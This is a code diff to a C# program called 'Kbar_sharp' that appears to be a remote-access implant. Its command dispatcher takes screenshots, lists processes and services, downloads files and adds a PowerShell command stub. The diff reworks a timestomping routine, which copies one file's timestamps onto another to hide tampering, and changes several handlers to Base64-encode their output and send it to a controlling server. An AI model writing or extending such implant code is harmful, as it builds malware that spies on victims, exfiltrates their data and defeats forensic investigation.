@@ -39,6 +39,8 @@ namespace Kbar_sharp
         
         }
 
+        
+
         static void sendPictureData(HttpClient cl, byte[] arr)
         {
             WebRequest request = WebRequest.Create("http://127.0.0.1/data/");
@@ -143,61 +145,85 @@ namespace Kbar_sharp
             return System.IO.File.ReadAllBytes(arg);
         }
 
-        static void timestomp(string arg)
+        static string timestomp(string arg)
         {
+            string timeret = "";
+            DateTime[] before = { new DateTime(), new DateTime(), new DateTime() };
             string good = arg.Split(' ')[0];
             string bad = arg.Split(' ')[1];
 
-            Console.WriteLine("If the time doesn't change check that the files exist");
-            
+            timeret += "If the time doesn't change check that the files exist\n";
 
 
-            Directory.SetCreationTime(bad, Directory.GetCreationTime(good));
-            Directory.SetLastAccessTime(bad, Directory.GetLastAccessTime(good));
-            Directory.SetLastWriteTime(bad, Directory.GetLastWriteTime(good));
+            try
+            {
+                before[0] = Directory.GetCreationTime(bad);
+                before[1] = Directory.GetLastAccessTime(bad);
+                before[2] = Directory.GetLastWriteTime(bad);
 
-            Console.WriteLine("Creation Time: " + Directory.GetCreationTime(bad));
-            Console.WriteLine("Last Access Time: " + Directory.GetLastAccessTime(bad));
-            Console.WriteLine("Last Write Time: " + Directory.GetLastWriteTime(bad));
+                Directory.SetCreationTime(bad, Directory.GetCreationTime(good));
+                Directory.SetLastAccessTime(bad, Directory.GetLastAccessTime(good));
+                Directory.SetLastWriteTime(bad, Directory.GetLastWriteTime(good));
+
+                timeret += "Creation Time: " + before[0] + " -> " + Directory.GetCreationTime(bad) + "\n";
+                timeret += "Last Access Time: " + before[1] + " -> " + Directory.GetLastAccessTime(bad) + "\n";
+                timeret += "Last Write Time: " + before[2] + " -> " + Directory.GetLastWriteTime(bad) + "\n";
+            }
+            catch(Exception e)
+            {
+                timeret = e.Message;
+            }
+
+            return Base64Encode(timeret);
         }
 
-        static void servlist()
+        static string servlist()
         {
             ServiceController[] service;
             service = ServiceController.GetServices();
             ManagementObject wmi;
+            string servret = "";
 
             foreach (ServiceController sc in service)
             {
-                Console.WriteLine();
-                Console.WriteLine("    Service :     {0}", sc.ServiceName);
-                Console.WriteLine("    DisplayName:     {0}", sc.DisplayName);
+                servret += "\n";
+                servret += "    Service :     {0}" + sc.ServiceName + "\n";
+                servret += "    DisplayName:     {0}" + sc.DisplayName + "\n";
                 wmi = new ManagementObject("Win32_service.Name='" + sc.ServiceName + "'");
                 wmi.Get();
-                Console.WriteLine("    Status:     {0}", wmi["State"]);
-                Console.WriteLine("    BinPath:    {0}", wmi["PathName"]);
+                servret += "    Status:     {0}" + wmi["State"] + "\n";
+                servret += "    BinPath:    {0}" + wmi["PathName"] + "\n";
             }
+
+            return Base64Encode(servret);
            
         }
 
-        static void proclist()
+        static string proclist()
         {
             Process[] all = Process.GetProcesses();
-
+            string procret = "";
             foreach(Process process in all)
             {
-                Console.WriteLine();
-                Console.WriteLine("Process Name:     {0}", process.ProcessName);
-                Console.WriteLine("PID:     {0}", process.Id);
+                procret += "\n";
+                procret += "Process Name:     " + process.ProcessName + "\n";
+                procret += "PID:     " + process.Id + "\n";
                 try
                 {
-                    Console.WriteLine("Path:     {0}", process.MainModule.FileName);
+                    procret += "Path:     {0}" + process.MainModule.FileName + "\n";
                 }
                 catch(Exception e)
                 {
-                    Console.WriteLine("Access is denied");
+                    procret += "Access is denied\n";
                 }
             }
+
+            return Base64Encode(procret);
+        }
+
+        static void powercom(string args)
+        {
+            
         }
 
         public static void executeCommand(String com, HttpClient cl)
@@ -227,16 +253,19 @@ namespace Kbar_sharp
                     sendPictureData(cl, comScreenshot());
                     break;
                 case "time":
-                    timestomp(arg);
+                    sendData(cl, timestomp(arg));
                     break;
                 case "servlist":
-                    servlist();
+                    sendData(cl, servlist());
                     break;
                 case "proclist":
-                    proclist();
+                    sendData(cl, proclist());
                     break;
                 case "get":
                     sendBinaryData(cl, comDownload(arg));
+                    break;
+                case "powershell":
+                    powercom(arg);
                     break;
                 default:
                     Console.WriteLine();
